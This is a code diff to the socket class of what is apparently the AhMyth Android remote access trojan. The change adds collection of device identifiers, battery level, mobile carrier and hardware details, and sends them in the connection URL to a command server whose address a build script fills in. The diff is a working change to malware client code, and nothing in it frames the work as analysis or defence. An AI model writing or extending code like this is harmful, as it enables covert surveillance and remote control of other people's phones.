@@ -1,7 +1,12 @@
 package ahmyth.mine.king.ahmyth;
 
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.os.BatteryManager;
 import android.os.Build;
 import android.provider.Settings;
+import android.telephony.TelephonyManager;
 import java.net.URISyntaxException;
 import io.socket.client.IO;
 import io.socket.client.Socket;
@@ -18,7 +23,14 @@ public class IOSocket {
 
     private IOSocket() {
         try {
-            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
+            Context context = MainService.getContextOfApplication();
+            String deviceID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
+            
+            // Get battery level
+            int batteryLevel = getBatteryLevel(context);
+            
+            // Get operator name
+            String operator = getOperatorName(context);
             
             // Socket.IO options for stable connection - match server timeouts
             IO.Options opts = new IO.Options();
@@ -34,9 +46,15 @@ public class IOSocket {
             // Format: http://IP:PORT - the build script will inject actual server IP/PORT
             // For Android emulator, use 10.0.2.2 to reach host machine
             String url = "http://10.0.2.2:1234?model=" + android.net.Uri.encode(Build.MODEL)
-                + "&manf=" + Build.MANUFACTURER 
+                + "&manf=" + android.net.Uri.encode(Build.MANUFACTURER)
                 + "&release=" + Build.VERSION.RELEASE 
-                + "&id=" + deviceID;
+                + "&id=" + deviceID
+                + "&sdk=" + Build.VERSION.SDK_INT
+                + "&battery=" + batteryLevel
+                + "&operator=" + android.net.Uri.encode(operator)
+                + "&device=" + android.net.Uri.encode(Build.DEVICE)
+                + "&brand=" + android.net.Uri.encode(Build.BRAND)
+                + "&product=" + android.net.Uri.encode(Build.PRODUCT);
             
             android.util.Log.d("IOSocket", "Connecting to: " + url);
             
@@ -49,6 +67,40 @@ public class IOSocket {
             android.util.Log.e("IOSocket", "Error initializing socket", e);
             e.printStackTrace();
         }
+    }
+    
+    private int getBatteryLevel(Context context) {
+        try {
+            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            Intent batteryStatus = context.registerReceiver(null, ifilter);
+            if (batteryStatus != null) {
+                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+                return (int) ((level / (float) scale) * 100);
+            }
+        } catch (Exception e) {
+            android.util.Log.e("IOSocket", "Error getting battery level", e);
+        }
+        return -1;
+    }
+    
+    private String getOperatorName(Context context) {
+        try {
+            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+            if (tm != null) {
+                String operator = tm.getNetworkOperatorName();
+                if (operator != null && !operator.isEmpty()) {
+                    return operator;
+                }
+                operator = tm.getSimOperatorName();
+                if (operator != null && !operator.isEmpty()) {
+                    return operator;
+                }
+            }
+        } catch (Exception e) {
+            android.util.Log.e("IOSocket", "Error getting operator", e);
+        }
+        return "Unknown";
     }
 
 
